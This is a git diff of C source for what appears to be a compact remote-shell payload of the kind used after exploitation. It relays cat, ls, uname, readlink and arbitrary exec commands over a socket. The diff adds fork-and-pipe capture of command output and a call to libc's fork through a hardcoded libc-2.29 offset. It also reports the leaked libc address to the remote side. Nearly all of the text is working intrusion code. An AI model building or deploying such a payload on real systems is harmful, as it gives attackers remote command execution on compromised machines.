@@ -1,5 +1,15 @@
 #include "include.h"
 
+void write_int(int s, long code, int radix)
+{
+  long itoabuf[2];
+  int len;
+  len = _ltoa(code, (char *)itoabuf, radix);
+  ((char *)itoabuf)[len] = '\n';
+  ((char *)itoabuf)[len + 1] = '0';
+  write(s, (char *)itoabuf, len + 1);
+}
+
 void cat_command(data_t *data, const char *path)
 {
   int fd, nread, count;
@@ -14,7 +24,7 @@ void cat_command(data_t *data, const char *path)
 #ifndef _COMPACT
   PRINT_TEXT(data->s, "- Listing file ");
   PRINT_STR(data->s, path);
-  PRINT_TEXT(data->s, data->symbols.newline);
+  PRINT_CHARS(data->s, data->symbols.newline);
 #endif
 
   count = 0;
@@ -50,10 +60,11 @@ void exec_command(data_t *data, const char *path)
 {
   char *args[10];
   int res = 0;
-  char * ptr, * begin;
+  char *ptr, *begin;
+  int /*in[2], */ out[2], pid;
 
-  ptr = begin = (char*)path;
-  for(;;)
+  ptr = begin = (char *)path;
+  for (;;)
   {
     if (!*ptr)
       break;
@@ -66,19 +77,74 @@ void exec_command(data_t *data, const char *path)
     ptr++;
   }
   args[res] = begin;
-  args[res + 1] = 0; 
+  args[res + 1] = 0;
 
-  res = _execve(args[0], args, NULL);
+  // pipe(in);
+  pipe(out);
 
-  if (res < 0)
+#ifdef LIBC
+  if (data->libc_addr)
   {
-#ifndef _COMPACT
-    PRINT_TEXT(data->s, "exec() error: ");
-    PRINT_INT(data->s, res);
-#else
-    PRINT_TEXT(data->s, data->symbols.error);
-#endif
+    // libc fork() uses sys_clone syscall internally so it could be used when sys_fork is unavailable
+    // however following code is highly version dependent and 0xc19b0 offset is only valid for libc-2.29 that I'm using
+
+    pid = (*(int(*)())(data->libc_addr + 0xc19b0))();
   }
+  else
+#endif
+    pid = fork();
+
+  if (pid == -1)
+  {
+    PRINT_ERROR(data->s, "fork()");
+    return;
+  }
+
+  if (pid == 0)
+  {
+    // // assign read end to stdin
+    // dup2(in[0],  STDIN_FILENO);
+    // assign write end to stdout
+    dup2(out[1], STDOUT_FILENO);
+    // assign write end to stderr
+    dup2(out[1], STDERR_FILENO);
+
+    // close pipes
+    // close(in[0]); close(in[1]);
+    close(out[0]);
+    close(out[1]);
+
+    res = _execve(args[0], args, NULL);
+    if (res < 0)
+    {
+      PRINT_INT(STDERR_FILENO, res);
+      PRINT_ERROR(STDERR_FILENO, "do_exec()");
+    }
+
+    _exit(127);
+    return;
+  }
+
+  // close(in[0]);
+  close(out[1]);
+
+  for (;;)
+  {
+    res = read(out[0], data->temp, BUFSIZ);
+    if (res == 0)
+      break;
+
+    if (res < 0)
+    {
+      PRINT_ERROR(out[0], "read()");
+      break;
+    }
+
+    write(data->s, data->temp, res);
+  }
+
+  //  close(in[1]);
+  close(out[0]);
 }
 
 void ls_command(data_t *data, const char *path)
@@ -87,7 +153,7 @@ void ls_command(data_t *data, const char *path)
   struct linux_dirent *d;
   char d_type;
 
-  fd = _open(path, 0 /*O_RDONLY  | O_DIRECTORY*/, 0);
+  fd = _open(path, 0, 0); // It should be O_RDONLY | O_DIRECTORY, 0 but some linux functions use 0 instead. I'll try it first
   if (fd < 0)
   {
     PRINT_ERROR(data->s, "open()");
@@ -97,7 +163,7 @@ void ls_command(data_t *data, const char *path)
 #ifndef _COMPACT
   PRINT_TEXT(data->s, "- Listing ");
   PRINT_STR(data->s, path);
-  PRINT_TEXT(data->s, data->symbols.newline);
+  PRINT_CHARS(data->s, data->symbols.newline);
 #endif
 
   count = 0;
@@ -113,7 +179,7 @@ void ls_command(data_t *data, const char *path)
       bpos += d->d_reclen;
 
       PRINT_STR(data->s, d->d_name);
-      PRINT_TEXT(data->s, data->symbols.newline);
+      PRINT_CHARS(data->s, data->symbols.newline);
 
       count++;
     }
@@ -143,15 +209,29 @@ void uname_command(data_t *data)
   }
 
   PRINT_STR(data->s, udata->sysname);
-  PRINT_TEXT(data->s, data->symbols.newline);
+  PRINT_CHARS(data->s, data->symbols.newline);
   PRINT_STR(data->s, udata->nodename);
-  PRINT_TEXT(data->s, data->symbols.newline);
+  PRINT_CHARS(data->s, data->symbols.newline);
   PRINT_STR(data->s, udata->release);
-  PRINT_TEXT(data->s, data->symbols.newline);
+  PRINT_CHARS(data->s, data->symbols.newline);
   PRINT_STR(data->s, udata->version);
-  PRINT_TEXT(data->s, data->symbols.newline);
+  PRINT_CHARS(data->s, data->symbols.newline);
   PRINT_STR(data->s, udata->machine);
-  PRINT_TEXT(data->s, data->symbols.newline);
+  PRINT_CHARS(data->s, data->symbols.newline);
+
+#ifndef _COMPACT
+  PRINT_TEXT(data->s, "Libc address: ");
+  PRINT_HEX(data->s, data->libc_addr);
+#else
+  if (data->libc_addr)
+  {
+    PRINT_TEXT(data->s, "LIBC\n");
+  }
+  else
+  {
+    PRINT_TEXT(data->s, "No LIBC!\n");
+  }
+#endif
 }
 
 void readlink_command(data_t *data, const char *path)
@@ -165,7 +245,7 @@ void readlink_command(data_t *data, const char *path)
   }
 
   PRINT_LEN(data->s, data->temp, len);
-  PRINT_TEXT(data->s, data->symbols.newline);
+  PRINT_CHARS(data->s, data->symbols.newline);
 }
 
 inline void process_command(data_t *data)
@@ -194,7 +274,8 @@ inline void process_command(data_t *data)
   }
   else if (data->command[0] == 'p') // pwd
   {
-    readlink_command(data, "/proc/self/cwd");
+    char cwd[] = "/proc/self/cwd";
+    readlink_command(data, cwd);
   }
   else if (data->command[0] == 'r') // readlink
   {
@@ -231,6 +312,6 @@ inline void process_command(data_t *data)
 #ifndef _COMPACT
     PRINT_TEXT(data->s, "Unknown command!\n");
 #else
-    PRINT_TEXT(data->s, data->symbols.error);
+    PRINT_CHARS(data->s, data->symbols.error);
 #endif
 }
